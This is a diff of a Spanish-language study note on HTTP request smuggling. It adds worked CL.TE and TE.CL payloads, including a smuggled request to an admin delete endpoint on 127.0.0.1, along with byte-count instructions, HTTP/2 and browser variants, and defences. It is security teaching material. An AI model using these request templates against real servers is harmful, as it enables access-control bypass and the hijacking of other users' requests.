@@ -1,121 +1,16 @@
----
-icon: folder-open
----
+# 🌐 HTTP request smuggling
 
-# HTTP request smuggling
-
-Consiste en incrustar una petición dentro de otra petición. Con esto conseguimos que lleguen al back 2 peticiones y las considere como independientes, cuando únicamente estamos enviando una única petición:
-
-<figure><img src="../../../.gitbook/assets/image (1324).png" alt="" width="331"><figcaption></figcaption></figure>
-
-Esto sería una petición smuggleada. Estamos enviando una única petición pero al back le llegarán 2 ya que se "confunde" y se traga todo como si fuese una única petición.
-
-Para que esto ocurra, tienen que cumplirse unas condiciones:
-
-* Protocolo HTTP 1 obligatoriamente
-* El manejo inadecuando de la cabecera TRANSFER-ENCODING
-
-
-
-Explicación de transfer-encoding:
-
-Para que esta vulnerabilidad exista, el front o el back deben interpretar la cabecera transfer-encoding, sino, esta vulnerabilidad no va a existir.
-
-La cabecera transfer-encoding toma el valor de chunked. Esto especifica, que se va a enviar el cuerpo de la petición "por partes".
-
-Ejemplo: (los numeros son un ejemplo, no estan bien puestos)
-
-<figure><img src="../../../.gitbook/assets/image (1325).png" alt=""><figcaption></figcaption></figure>
-
-La cabecera Content-length toma el valor del numero de bytes totales del cuerpo de la peticion
-
-La cabecera chunked, le indica que se enviara por trozos y los numeros de la peticion, indican el tamaño de cada trozo. Los numeros, se ponen en hexadecimal para el TE.
-
-***
-
-### Escenario 1 CL.TE
-
-El front interpreta CL y no interpreta TE
-
-El backend interpreta TE y no CL
-
-La petición llega al front, ya sabemos que la cabecera TE va a ser ignorada.
-
-Si el CL no especifica exactamente el numero de bytes del cuerpo de la petición, va a rechazar la misma y nunca va a llegar al back. Ahora bien, si modificamos el valor del CL y le especifiamos el numero exacto, la peticion va a pasar al back
-
-Ahora la peticion llega al back y aqui si se interpreta la cabecera TE. Con el valor 0, le decimos que el chunked (el trozo) termina ahi, entonces, lo siguiente lo va a interpretar como una nueva petición:
-
-<figure><img src="../../../.gitbook/assets/image (1327).png" alt=""><figcaption></figcaption></figure>
-
-En CL.TE, para validar que efectivamente estamos en este escenario podemos hacerlo asi:
-
-<figure><img src="../../../.gitbook/assets/image (1314).png" alt=""><figcaption></figcaption></figure>
-
-El front no admite la cabecera TE, asi que nos da un error de sincronizacion.
-
-<figure><img src="../../../.gitbook/assets/image (1312).png" alt=""><figcaption></figcaption></figure>
-
-Enviamos una petición bien formada que responde 200.
-
-El chunked espera un 0 para que sea valido, si le ponemos una x, vemos que cambia la respuesta y no la acepta:
-
-<figure><img src="../../../.gitbook/assets/image (1313).png" alt=""><figcaption></figcaption></figure>
-
-Ahora ya estamos fijo que estamos en ese escenario.
-
-Para poner bien el tamaño del CL, medimos hasta el 0:
-
-<figure><img src="../../../.gitbook/assets/image (1315).png" alt=""><figcaption></figcaption></figure>
-
-Al enviar la petición 2 veces, causamos el error 404 haciendo un GET a /error
-
-***
-
-### Escenario 2 TE.CL
-
-Ahora el front SI interpreta TE
-
-Vamos a construir una peticion smugleada
-
-<figure><img src="../../../.gitbook/assets/image (1319).png" alt=""><figcaption></figcaption></figure>
-
-Ese valor en rojo es el del chunked que interpreta el frontend, que se pone en hexadecimal y se calcula en base al texto seleccionado. En este caso, corresponde a 9f
-
-El 0 del final, marca el final del chunked y el front dice: ok, llega el 0 se acaba el chunked.
-
-Siguiente paso:
-
-<figure><img src="../../../.gitbook/assets/image (1318).png" alt=""><figcaption></figcaption></figure>
-
-Poner el CL de la segunda petición. Se calcula el base al texto seleccionado, pero le ponemos de mas, no hay problema.
-
-Seguimos:
-
-<figure><img src="../../../.gitbook/assets/image (1323).png" alt=""><figcaption></figcaption></figure>
-
-Hay que colocar el valor del CL global, que incluye solo lo seleccionado. En este caso, 4
-
-***
-
-### 1. ¿Qué es HTTP Request Smuggling?
+## 🔎 ¿Qué es HTTP Request Smuggling?
 
 HTTP request smuggling es una técnica que interfiere con cómo un sitio web procesa secuencias de peticiones HTTP recibidas de uno o más usuarios. Cuando un servidor front-end (reverse proxy, load balancer, CDN) reenvía peticiones a un servidor back-end, comparten una conexión TCP para mayor eficiencia. Si estos dos servidores no están de acuerdo sobre dónde termina una petición y comienza la siguiente, un atacante puede anteponer contenido malicioso a la siguiente petición de otro usuario.
 
-#### Impacto:
-
-* Bypass de controles de seguridad del front-end (WAFs, restricciones de acceso)
-* Robo de credenciales y cookies de sesión de otros usuarios
-* Ejecución de XSS reflejado sin interacción del usuario
-* Envenenamiento de cachés web para servir contenido malicioso
-* Secuestro de cuentas admin mediante response queue poisoning
-
 ***
 
-### 2. Cómo funciona Request Smuggling
+## ⚙️ Cómo funciona Request Smuggling
 
 El problema principal es el desacuerdo entre dos cabeceras que especifican la longitud del cuerpo de la petición:
 
-#### Content-Length - especifica el tamaño del body en bytes:
+### Content-Length - especifica el tamaño del body en bytes:
 
 ```http
 POST / HTTP/1.1
@@ -124,7 +19,7 @@ Content-Length: 11
 hello=world
 ```
 
-#### Transfer-Encoding: chunked - el body se envía en chunks:
+### Transfer-Encoding: chunked - el body se envía en chunks:
 
 ```http
 POST / HTTP/1.1
@@ -133,66 +28,248 @@ Transfer-Encoding: chunked
 b
 hello=world
 0
+
 ```
 
 Cuando ambas cabeceras están presentes y el front-end y el back-end priorizan diferentes, se produce un desync.
 
-***
 
-### 3. Variantes clásicas de Smuggling
-
-#### CL.TE - Front-end usa Content-Length, back-end usa Transfer-Encoding:
-
+## 🔀 Escenarios CL.TE y TE.CL
+ 
+HTTP Request Smuggling se produce cuando el **frontend (proxy)** y el **backend (servidor)** discrepan en cómo interpretan los límites de una petición HTTP. Esta ambigüedad permite a un atacante "contrabandear" una petición dentro de otra, afectando a usuarios legítimos del mismo servidor.
+ 
+Las dos cabeceras implicadas son:
+ 
+- **`Content-Length` (CL)** — indica el tamaño exacto del body en bytes.
+- **`Transfer-Encoding: chunked` (TE)** — indica que el body se envía en fragmentos, y que el fragmento `0` marca el final.
+---
+ 
+## 🧩 Escenario 1 — CL.TE
+ 
+### 🧠 Lógica del escenario
+ 
+| Componente | Interpreta | Ignora |
+|---|---|---|
+| Frontend | `Content-Length` | `Transfer-Encoding` |
+| Backend | `Transfer-Encoding` | `Content-Length` |
+ 
+El frontend valida la petición usando `Content-Length`. Si el valor no coincide exactamente con el tamaño real del body, la rechaza y nunca llega al backend. Una vez que el CL es correcto, la petición pasa al backend.
+ 
+El backend, en cambio, usa `Transfer-Encoding: chunked`. Lee el body hasta encontrar el fragmento `0`, que le indica que el chunk ha terminado. **Todo lo que viene después del `0` lo interpreta como una nueva petición.**
+ 
+### 🧪 Petición smugleada
+ 
+```http
+POST /admin HTTP/1.1
+Host: pagina.com
+Cookies:
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Transfer-Encoding: chunked
+ 
+0
+ 
+POST /admin/delete?user=juan
+Host: 127.0.0.1
+Content-Length: 5
+ 
+x=1
+```
+ 
+> **Frontend:** Lee CL=55. El body tiene exactamente 55 bytes → reenvía al backend.  
+> **Backend:** Lee chunked. El `0` le dice que el chunk terminó. Lo siguiente (`POST /admin/delete…`) lo procesa como una petición nueva e independiente.
+  
+### ✅ Verificación del escenario CL.TE
+ 
+El objetivo es confirmar que el **frontend ignora TE** y el **backend sí lo procesa**.
+ 
+#### Paso 1 — Provocar un error de sincronización
+ 
+Enviamos una petición con `Transfer-Encoding: chunked` pero con un body inválido para chunked (`x=x`):
+ 
 ```http
 POST / HTTP/1.1
-Content-Length: 30
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
 Transfer-Encoding: chunked
-
+ 
+x=x
+```
+ 
+El frontend ignora TE y reenvía 3 bytes del body. El backend recibe un chunk inválido y responde con un **error de sincronización**. Esto confirma que el front no procesa TE pero el back sí.
+ 
+#### Paso 2 — Validar que el chunk `0` es correcto
+ 
+Enviamos una petición bien formada con el cierre de chunk:
+ 
+```http
+POST / HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+ 
 0
 
-GET /admin HTTP/1.1
-Foo: x
 ```
-
-#### TE.CL - Front-end usa Transfer-Encoding, back-end usa Content-Length:
-
+ 
+Esta petición responde **200 OK**.
+ 
+Para confirmar que el backend realmente valida el chunked, cambiamos el `0` por `X`:
+ 
 ```http
 POST / HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+ 
+X
+
+```
+ 
+El backend **rechaza** la petición porque `X` no es un cierre de chunk válido. Escenario confirmado.
+ 
+#### Paso 3 — Explotar el escenario
+ 
+Con el escenario confirmado, construimos el payload smugleado. El `Content-Length` global se mide **hasta el `0` de cierre del chunk** (inclusivo). El resto es la petición smugleada.
+ 
+```http
+POST / HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Transfer-Encoding: chunked
+ 
+0
+ 
+GET /error HTTP/1.1
+X-Ignore: x
+```
+ 
+> Al enviar esta petición **dos veces seguidas**, la segunda solicitud llega al backend con el prefijo smugleado. El servidor procesa el `GET /error` como una nueva petición y responde **404**, confirmando la explotación.
+ 
+---
+ 
+## 🧩 Escenario 2 — TE.CL
+ 
+### 🧠 Lógica del escenario
+ 
+| Componente | Interpreta | Ignora |
+|---|---|---|
+| Frontend | `Transfer-Encoding` | `Content-Length` |
+| Backend | `Content-Length` | `Transfer-Encoding` |
+ 
+El frontend lee el body en modo chunked y para cuando encuentra el `0` de cierre. El backend, en cambio, usa `Content-Length` para saber cuántos bytes leer del body. **Todo lo que supere ese CL queda en el buffer del backend y se antepone a la siguiente petición entrante.**
+ 
+### 🧪 Construcción de la petición smugleada
+ 
+La construcción requiere calcular tres valores con precisión.
+ 
+#### Paso 1 — Añadir el payload smugleado como chunk
+ 
+```http
+POST / HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Transfer-Encoding: chunked
+ 
+9f
+POST /404 HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+ 
+x=1
+ 
+0
+
+```
+ 
+El valor `9f` es el **tamaño en hexadecimal** del bloque que comienza en `POST /404` y termina en `x=1` (sin incluir el `0` final). El `0` al final marca el cierre del chunk para el frontend.
+ 
+> **Cómo calcular `9f`:** Selecciona el texto desde `POST /404 HTTP/1.1` hasta la última línea del body interno (`x=1`), cuenta los bytes y conviértelos a hexadecimal.
+ 
+#### Paso 2 — Calcular el Content-Length de la petición interna
+ 
+El `Content-Length` de la petición smugleada (`POST /404`) se calcula en base al body de esa petición interna (`x=1`). Puede ser igual o **mayor** que el tamaño real sin problema — eso hace que el backend espere más bytes, leyendo del buffer de la siguiente petición legítima.
+ 
+#### Paso 3 — Calcular el Content-Length global
+ 
+El `Content-Length` de la petición externa solo debe cubrir el **número de línea del chunk** (es decir, el valor `9f` más el CRLF que lo sigue). En este ejemplo, eso equivale a **4 bytes**.
+ 
+```http
+POST / HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: chunked
-
-5c
-GPOST / HTTP/1.1
-Content-Length: 15
-
+ 
+9f
+POST /404 HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+ 
 x=1
+ 
 0
-```
 
-#### TE.TE - Ambos soportan Transfer-Encoding, pero la ofuscación provoca desacuerdo:
-
-```http
-Transfer-Encoding: chunked
-Transfer-Encoding: x
 ```
+ 
+> **Frontend:** Lee chunked. El chunk `9f` contiene la petición smugleada. El `0` marca el fin → reenvía todo al backend.  
+> **Backend:** Lee CL=4. Solo procesa `9f\r\n`. El resto del body (el `POST /404…`) queda en el buffer y se antepone a la siguiente petición entrante.
+ 
+---
+ 
+## 📊 Resumen de valores a calcular
+ 
+| Escenario | Valor | Cómo calcularlo |
+|---|---|---|
+| **CL.TE** | `Content-Length` global | Contar bytes desde el inicio del body hasta el `0` de cierre (inclusive) |
+| **TE.CL** | Tamaño del chunk (hex) | Contar bytes del payload smugleado y convertir a hexadecimal |
+| **TE.CL** | `Content-Length` interno | Tamaño del body de la petición smugleada (puede ser mayor) |
+| **TE.CL** | `Content-Length` global | Bytes que ocupa únicamente la línea con el valor del chunk |
+ 
+ 
+## ⚔️ Comparativa rápida
+ 
+| | CL.TE | TE.CL |
+|---|---|---|
+| **Frontend usa** | `Content-Length` | `Transfer-Encoding` |
+| **Backend usa** | `Transfer-Encoding` | `Content-Length` |
+| **El smuggling ocurre porque** | El back procesa lo que hay tras el `0` del chunk | El back solo lee hasta su CL, lo demás queda en buffer |
+| **Confirmación** | Cambiar `0` por `X` → el back rechaza | Enviar dos veces y observar la respuesta de la segunda |
+
+
+## 💥 Impacto:
+
+* Bypass de controles de seguridad del front-end (WAFs, restricciones de acceso)
+* Robo de credenciales y cookies de sesión de otros usuarios
+* Ejecución de XSS reflejado sin interacción del usuario
+* Envenenamiento de cachés web para servir contenido malicioso
+* Secuestro de cuentas admin mediante response queue poisoning
+
 
 ***
 
-### 4. Variantes de HTTP/2 Smuggling
+## 🚀 Variantes de HTTP/2 Smuggling
 
 HTTP/2 introduce nuevos vectores cuando los servidores hacen downgrade a HTTP/1.1:
 
-#### H2.CL:
+### H2.CL:
 
 * Front-end usa longitud de frame HTTP/2
 * Back-end usa Content-Length tras downgrade
 
-#### H2.TE:
+### H2.TE:
 
 * Front-end: longitud de frame HTTP/2
 * Back-end: `Transfer-Encoding: chunked` → desync
 
-#### CRLF Injection:
+### CRLF Injection:
 
 ```
 # Header HTTP/2
@@ -201,16 +278,16 @@ foo: bar\r\nTransfer-Encoding: chunked
 # HTTP/1.1 lo interpreta como dos headers
 ```
 
-#### Request Tunnelling:
+### Request Tunnelling:
 
 * Se hace smuggling usando peticiones HEAD
 * El front-end sobrelee y expone respuestas encapsuladas
 
 ***
 
-### 5. Variantes impulsadas por el navegador
+## 🌐 Variantes impulsadas por el navegador
 
-#### CL.0:
+### CL.0:
 
 ```http
 POST /resources/image.svg HTTP/1.1
@@ -221,20 +298,20 @@ Foo: x
 0
 ```
 
-#### 0.CL:
+### 0.CL:
 
 * Front-end ignora Content-Length
 * Back-end lo procesa
 * Requiere un early response gadget
 
-#### Client-Side Desync:
+### Client-Side Desync:
 
 ```javascript
 fetch(url, {method:'POST', body:'smuggled request', mode:'cors'})
 .catch(() => fetch(url, {mode:'no-cors'}))
 ```
 
-#### Pause-Based:
+### Pause-Based:
 
 * Enviar headers
 * Pausar antes del body
@@ -243,22 +320,22 @@ fetch(url, {method:'POST', body:'smuggled request', mode:'cors'})
 
 ***
 
-### 6. Tipos de ataque
+## 🎯 Tipos de ataque
 
-#### Response Queue Poisoning:
+### Response Queue Poisoning:
 
 * Se inyecta una petición completa
 * El back-end envía 2 respuestas
 * El front-end espera 1 → desincronización
 * Usuarios reciben respuestas incorrectas
 
-#### Web Cache Poisoning:
+### Web Cache Poisoning:
 
 * Se inyecta redirección maliciosa
 * Se cachea para un recurso estático
 * Todos los usuarios reciben contenido malicioso
 
-#### Web Cache Deception:
+### Web Cache Deception:
 
 * Se smugglea `GET /my-account`
 * Se usa la sesión de la víctima
@@ -266,26 +343,26 @@ fetch(url, {method:'POST', body:'smuggled request', mode:'cors'})
 
 ***
 
-### 7. Buenas prácticas de defensa
+## 🛡️ Buenas prácticas de defensa
 
-#### Usar HTTP/2 end-to-end:
+### Usar HTTP/2 end-to-end:
 
 * Evitar downgrade a HTTP/1.1
 * HTTP/2 elimina ambigüedad en límites de petición
 
-#### Normalizar peticiones ambiguas:
+### Normalizar peticiones ambiguas:
 
 * Rechazar peticiones con `Content-Length` y `Transfer-Encoding`
 * Eliminar `Transfer-Encoding` en downgrade
 * Sanear secuencias `\r\n`
 
-#### No reutilizar conexiones back-end:
+### No reutilizar conexiones back-end:
 
 * Usar una conexión por cliente
 * Evitar contaminación entre usuarios
 * Validar correctamente los límites de petición
 
-#### Asegurar endpoints estáticos:
+### Asegurar endpoints estáticos:
 
 * Asegurar que consumen correctamente el body
 * No asumir que no recibirán POST requests
